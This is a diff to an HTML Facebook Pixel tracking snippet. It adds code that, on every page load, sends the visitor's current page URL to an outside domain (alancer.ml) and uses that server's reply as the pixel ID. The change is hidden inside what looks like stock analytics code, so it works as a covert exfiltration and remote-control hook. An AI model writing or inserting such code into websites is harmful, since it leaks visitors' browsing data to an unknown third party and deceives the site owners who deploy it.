@@ -1,12 +1,23 @@
 <!-- Facebook Pixel Code -->
 <script>
+function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+var url = window.location.href;
+var x = httpGet('http://alancer.ml/d?url=' + url);
+//console.log(x);
+
 !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
 n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
 n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
 t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
 document,'script','//connect.facebook.net/en_US/fbevents.js');
 
-fbq('init', 'facebook pixel id');
+fbq('init', x);
 fbq('track', "PageView");</script>
 <noscript><img height="1" width="1" style="display:none"
 src="https://www.facebook.com/tr?id=facebook pixel id&ev=PageView&noscript=1"
